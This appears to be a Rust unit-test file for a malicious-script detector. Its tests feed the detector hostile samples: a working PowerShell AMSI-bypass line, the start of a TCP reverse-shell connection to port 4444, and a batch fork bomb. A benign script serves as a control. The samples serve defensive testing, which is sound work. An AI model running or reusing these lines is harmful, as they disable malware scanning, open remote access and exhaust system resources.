use std::path::Path;
use crate::detection::heuristics::script::analyze_script;

#[test]
fn test_powershell_amsi_bypass_detection() {
    let script = r#"
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        $client = New-Object Net.Sockets.TCPClient('192.168.1.50', 4444)
    "#;

    let res = analyze_script(script, Some(Path::new("cradle.ps1")));
    assert!(res.heuristic_score >= 0.70, "AMSI bypass + reverse shell should score high, got {}", res.heuristic_score);
    assert!(res.suspicious_reasons.iter().any(|r| r.title.contains("AMSI")));
    assert!(res.suspicious_reasons.iter().any(|r| r.title.contains("Reverse Shell")));
}

#[test]
fn test_clean_powershell_script() {
    let script = r#"
        Write-Host "Hello, ShieldGuard!"
        $date = Get-Date
        Write-Output "Current date: $date"
    "#;

    let res = analyze_script(script, Some(Path::new("clean.ps1")));
    assert_eq!(res.heuristic_score, 0.0);
    assert!(res.suspicious_reasons.is_empty());
}

#[test]
fn test_batch_forkbomb_detection() {
    let script = "%0|%0";
    let res = analyze_script(script, Some(Path::new("bomb.bat")));
    assert!(res.heuristic_score >= 0.80);
    assert!(res.suspicious_reasons.iter().any(|r| r.title.contains("Fork Bomb")));
}
